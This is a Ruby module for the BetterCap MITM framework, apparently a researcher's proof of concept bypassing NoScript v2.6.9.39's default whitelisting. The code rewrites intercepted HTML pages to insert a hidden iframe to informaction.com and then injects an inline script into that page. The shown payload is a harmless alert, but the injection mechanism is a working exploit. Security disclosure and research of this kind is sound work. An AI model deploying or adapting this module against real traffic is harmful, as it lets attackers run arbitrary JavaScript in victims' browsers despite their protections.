=begin

BETTERCAP
Module: HackNoScript

Author    : Mazin Ahmed
Email  	  : mazin AT mazinahmed DOT net
Website   : https://mazinahmed.net

Description:- 
This module exploits an issue in NoScript v2.6.9.39. The module bypasses NoScritpt v2.6.9.39 default whitelisting settings, enabling attackers to execute unrestrected malicious JS on the vicitms' browsers using MITM attacks.

Affected Product:-
NoScript (https://noscript.net)

Affected Versions:-
The issue has been tested on v2.6.9.39, previous versions maybe vulnerable as well.


=end

class HackNoScript < BetterCap::Proxy::HTTP::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.info "Modifying http://#{request.host}#{request.path}"
      # make sure to use sub! or gsub! to update the instance
      
      #Forcing every unencrypted page to include an invisible iframe that points to [http://www.informaction.com/].
      response.body.sub!( '</title>', '</title> <iframe src="http://www.informaction.com/" style="display:none;"></iframe>')
      
      #Once the above request is done, the following will inject inline Javascript code on [http://www.informaction.com/] that bypasses NoScript default whitelisting settings. 
      response.body.sub!( '<meta name="description" content="InformAction company home page" />', '<meta name="description" content="InformAction company home page" /> <script>alert("@mazen160");</script>' )
    end
  end
end
